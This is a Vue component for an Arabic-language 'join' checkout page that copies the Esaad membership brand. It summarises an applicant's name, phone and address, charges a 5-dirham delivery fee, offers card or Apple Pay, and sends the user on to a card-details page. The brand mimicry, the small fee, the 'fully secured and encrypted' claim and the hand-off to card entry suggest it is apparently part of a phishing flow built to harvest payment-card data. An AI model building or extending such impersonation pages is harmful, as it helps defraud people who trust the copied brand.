<script setup lang="ts">
import { ref, computed, onMounted } from 'vue';
import { useRouter } from 'vue-router';
import { ArrowRight, ShieldCheck } from 'lucide-vue-next';
import { getCardRequest, type RequestData } from '../api';

const router = useRouter();
const requestData = ref<RequestData | null>(null);
const selectedMethod = ref<'card' | 'apple_pay'>('card');

onMounted(async () => {
  try {
    const data = await getCardRequest();
    if (data) {
      requestData.value = data;
    }
  } catch (err) {
    console.error('Error loading request summary:', err);
  }
});

const cardTypeLabel = computed(() => {
  const type = requestData.value?.cardType;
  if (!type) return 'البلاتينية';
  const map: Record<string, string> = {
    platinum: 'البلاتينية',
    gold: 'الذهبية',
    silver: 'الأساسية',
    company: 'شركات'
  };
  return map[type] || type;
});

const goNext = () => {
  router.push('/card-details');
};

const goBack = () => {
  router.push('/request');
};
</script>

<template>
  <div dir="rtl" class="max-w-xl mx-auto bg-[#eef5f0] min-h-screen flex flex-col font-sans text-gray-900 relative overflow-hidden">
    <!-- Top Green/Dark Esaad Header -->
    <header class="w-full bg-[#040c06] px-4 py-3 flex items-center justify-between border-b border-[#009a44]/30 relative z-20">
      <button
        @click="goBack"
        aria-label="العودة"
        class="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 flex items-center justify-center text-white transition-colors cursor-pointer"
      >
        <ArrowRight class="w-4 h-4" />
      </button>

      <!-- Esaad Logo -->
      <div @click="router.push('/')" class="cursor-pointer flex flex-col items-center select-none">
        <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
        <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
        <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
          <circle cx="14" cy="4" r="2" fill="#39b54a" />
          <circle cx="46" cy="4" r="2" fill="#39b54a" />
          <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
        </svg>
      </div>

      <div class="w-8"></div>
    </header>

    <div class="flex-1 flex flex-col items-center pt-6 px-4 pb-8">
      <!-- Title: كن عضواً -->
      <h1 class="text-[26px] font-extrabold text-[#008a40] text-center mb-5 tracking-tight">
        كن عضواً
      </h1>

      <!-- 3-Step Indicator (Green Esaad Style) -->
      <div class="w-full max-w-[360px] mx-auto flex items-start justify-between mb-6 px-2">
        <!-- Step 1 -->
        <button
          type="button"
          @click="goBack"
          class="flex flex-col items-center cursor-pointer group"
        >
          <div class="w-10 h-10 rounded-full bg-[#009a44] text-white font-bold text-base flex items-center justify-center shadow-xs tabular-nums">
            1
          </div>
          <span class="text-[11.5px] font-bold text-gray-700 mt-1.5 whitespace-nowrap">
            معلومات شخصية
          </span>
        </button>

        <!-- Connector Line 1-2 -->
        <div class="flex-1 flex items-center justify-center pt-5 px-2">
          <div class="w-full max-w-[44px] h-[2.5px] bg-[#009a44] rounded-full"></div>
        </div>

        <!-- Step 2 -->
        <button
          type="button"
          @click="goBack"
          class="flex flex-col items-center cursor-pointer group"
        >
          <div class="w-10 h-10 rounded-full bg-[#009a44] text-white font-bold text-base flex items-center justify-center shadow-xs tabular-nums">
            2
          </div>
          <span class="text-[11.5px] font-bold text-gray-700 mt-1.5 whitespace-nowrap">
            معلومات العنوان
          </span>
        </button>

        <!-- Connector Line 2-3 -->
        <div class="flex-1 flex items-center justify-center pt-5 px-2">
          <div class="w-full max-w-[44px] h-[2.5px] bg-[#009a44] rounded-full"></div>
        </div>

        <!-- Step 3 (Active) -->
        <div class="flex flex-col items-center">
          <div class="w-10 h-10 rounded-full bg-[#008a40] text-white font-bold text-base flex items-center justify-center shadow-md ring-4 ring-[#009a44]/20 tabular-nums">
            3
          </div>
          <span class="text-[11.5px] font-extrabold text-[#008a40] mt-1.5 whitespace-nowrap">
            اشترك
          </span>
        </div>
      </div>

      <!-- Main Container Card -->
      <div class="w-full max-w-md bg-white rounded-2xl border border-gray-200/80 shadow-[0_4px_24px_rgba(0,0,0,0.05)] p-5">
        <!-- Card Section Title -->
        <h2 class="text-[18px] font-extrabold text-[#008a40] text-right mb-4">
          الفاتورة وطريقة الدفع
        </h2>

        <!-- Order Summary Table Box -->
        <div class="rounded-xl border border-gray-200/90 bg-[#fafdfa] overflow-hidden mb-4 divide-y divide-gray-100">
          <!-- Header Row -->
          <div class="py-3 px-4 text-right font-bold text-gray-500 text-[14px] bg-[#f0f7f2]">
            ملخص الطلب
          </div>

          <!-- Row: الاسم -->
          <div class="py-3 px-4 flex items-center justify-between gap-4 text-[13.5px]">
            <span class="text-gray-500 font-semibold shrink-0">الاسم</span>
            <span class="text-gray-900 font-extrabold text-left break-all" dir="auto">
              {{ requestData?.name || '—' }}
            </span>
          </div>

          <!-- Row: رقم الهاتف -->
          <div class="py-3 px-4 flex items-center justify-between gap-4 text-[13.5px]">
            <span class="text-gray-500 font-semibold shrink-0">رقم الهاتف</span>
            <span class="text-gray-900 font-extrabold text-left tabular-nums" dir="ltr">
              {{ requestData?.mobile || '—' }}
            </span>
          </div>

          <!-- Row: نوع البطاقة -->
          <div class="py-3 px-4 flex items-center justify-between gap-4 text-[13.5px]">
            <span class="text-gray-500 font-semibold shrink-0">نوع البطاقة</span>
            <span class="text-gray-900 font-extrabold text-left">
              {{ cardTypeLabel }}
            </span>
          </div>

          <!-- Row: رسوم العضوية -->
          <div class="py-3 px-4 flex items-center justify-between gap-4 text-[13.5px]">
            <span class="text-gray-500 font-semibold shrink-0">رسوم العضوية</span>
            <span class="text-gray-900 font-extrabold text-left tabular-nums">
              0 درهم
            </span>
          </div>

          <!-- Row: رسوم التوصيل -->
          <div class="py-3 px-4 flex items-center justify-between gap-4 text-[13.5px]">
            <span class="text-gray-500 font-semibold shrink-0">رسوم التوصيل</span>
            <span class="text-gray-900 font-extrabold text-left tabular-nums">
              5 درهم
            </span>
          </div>

          <!-- Row: العنوان -->
          <div class="py-3 px-4 flex items-center justify-between gap-4 text-[13.5px]">
            <span class="text-gray-500 font-semibold shrink-0">العنوان</span>
            <span class="text-gray-900 font-extrabold text-left" dir="auto">
              {{ requestData?.address || '—' }}
            </span>
          </div>

          <!-- Row: موعد الاستلام -->
          <div class="py-3 px-4 flex items-center justify-between gap-4 text-[13.5px]">
            <span class="text-gray-500 font-semibold shrink-0">موعد الاستلام</span>
            <span class="text-gray-900 font-extrabold text-left tabular-nums" dir="ltr">
              {{ requestData?.date || '20/11/2026' }}
            </span>
          </div>
        </div>

        <!-- Total Amount Box in Esaad Green Card Style -->
        <div class="rounded-xl border border-[#009a44]/30 bg-gradient-to-l from-[#009a44]/10 to-[#f0fdf4] px-4 py-3.5 mb-5 text-right flex items-center justify-between">
          <div>
            <div class="text-gray-600 font-bold text-xs mb-0.5">
              المبلغ الإجمالي
            </div>
            <div class="text-[#008a40] font-black text-[22px] leading-tight tabular-nums">
              5 درهم
            </div>
          </div>
          <span class="bg-[#009a44] text-white text-[11px] font-bold px-3 py-1 rounded-full shadow-2xs">
            شامل الرسوم
          </span>
        </div>

        <!-- Choose Payment Method Section -->
        <h3 class="text-[16px] font-extrabold text-gray-900 text-right mb-3">
          اختر طريقة الدفع
        </h3>

        <div class="space-y-2.5 mb-6">
          <!-- Option 1: فيزا / ماستركارد -->
          <div
            @click="selectedMethod = 'card'"
            class="w-full rounded-xl border px-3.5 py-3 flex items-center justify-between cursor-pointer transition-all"
            :class="
              selectedMethod === 'card'
                ? 'border-[#009a44] bg-[#f2faf4] shadow-2xs'
                : 'border-gray-200/90 bg-white hover:border-[#009a44]/50'
            "
          >
            <!-- Right side in RTL: Label + Logos -->
            <div class="flex items-center gap-2">
              <span class="font-extrabold text-[14px] text-gray-900">
                فيزا / ماستركارد
              </span>

              <!-- Blue VISA Badge -->
              <div class="bg-[#1a428a] text-white font-black italic text-[10px] px-2 py-0.5 rounded-[4px] tracking-wider leading-none flex items-center justify-center h-5">
                VISA
              </div>

              <!-- Mastercard Circles + Label -->
              <div class="flex flex-col items-center justify-center leading-none" dir="ltr">
                <div class="relative w-6 h-3.5 flex items-center justify-center">
                  <div class="w-3.5 h-3.5 rounded-full bg-[#eb001b] absolute left-0 opacity-95"></div>
                  <div class="w-3.5 h-3.5 rounded-full bg-[#f79e1b] absolute right-0 opacity-90"></div>
                </div>
                <span class="text-[5.5px] font-bold text-gray-700 tracking-tight mt-0.5">mastercard</span>
              </div>
            </div>

            <!-- Left side in RTL: Green Radio Circle -->
            <div
              class="w-5 h-5 rounded-full border-2 flex items-center justify-center shrink-0 transition-colors"
              :class="selectedMethod === 'card' ? 'border-[#009a44]' : 'border-gray-300'"
            >
              <div v-if="selectedMethod === 'card'" class="w-2.5 h-2.5 rounded-full bg-[#009a44]"></div>
            </div>
          </div>

          <!-- Option 2: أبل باي -->
          <div
            @click="selectedMethod = 'apple_pay'"
            class="w-full rounded-xl border px-3.5 py-3 flex items-center justify-between cursor-pointer transition-all"
            :class="
              selectedMethod === 'apple_pay'
                ? 'border-[#009a44] bg-[#f2faf4] shadow-2xs'
                : 'border-gray-200/90 bg-white hover:border-[#009a44]/50'
            "
          >
            <!-- Right side in RTL: Label + Apple Pay Badge -->
            <div class="flex items-center gap-2">
              <span class="font-extrabold text-[14px] text-gray-900">
                أبل باي
              </span>

              <!-- Apple Pay Dark Badge -->
              <div class="bg-black text-white px-2 py-0.5 rounded-[5px] flex items-center gap-1 h-5" dir="ltr">
                <svg class="w-2.5 h-2.5 fill-current" viewBox="0 0 24 24">
                  <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.96 6.33c.67-.81 1.12-1.94 1-3.08-.96.04-2.13.64-2.82 1.45-.61.7-.115 1.86-1.01 2.98 1.08.08 2.16-.54 2.83-1.35z" />
                </svg>
                <span class="text-[10px] font-semibold tracking-tight leading-none">Pay</span>
              </div>
            </div>

            <!-- Left side in RTL: Green Radio Circle -->
            <div
              class="w-5 h-5 rounded-full border-2 flex items-center justify-center shrink-0 transition-colors"
              :class="selectedMethod === 'apple_pay' ? 'border-[#009a44]' : 'border-gray-300'"
            >
              <div v-if="selectedMethod === 'apple_pay'" class="w-2.5 h-2.5 rounded-full bg-[#009a44]"></div>
            </div>
          </div>
        </div>

        <!-- Proceed to Payment Button (Esaad Green) -->
        <button
          type="button"
          @click="goNext"
          class="w-full bg-[#008a40] hover:bg-[#007335] text-white font-extrabold text-sm py-3.5 px-6 rounded-xl shadow-md transition-colors cursor-pointer"
        >
          متابعة الدفع
        </button>

        <!-- Trust Info -->
        <div class="mt-4 flex items-center justify-center gap-1.5 text-[11px] text-gray-500">
          <ShieldCheck class="w-3.5 h-3.5 text-[#008a40]" />
          <span>الدفع مؤمّن ومشفّر بالكامل عبر بطاقة إسعاد</span>
        </div>
      </div>
    </div>

    <!-- Esaad Footer -->
    <footer class="bg-[#e4f2ea] px-5 py-4 text-right border-t border-gray-200/60 mt-auto">
      <div class="flex items-center justify-between">
        <div class="flex flex-col items-center">
          <span class="text-[#008a40] font-black text-xs leading-none">إسعاد</span>
          <span class="text-gray-900 font-extrabold text-[10px] leading-none">esaad</span>
        </div>
        <span class="text-[11px] text-gray-600 font-medium">© 2026 esaad, كل الحقوق محفوظة.</span>
      </div>
    </footer>
  </div>
</template>
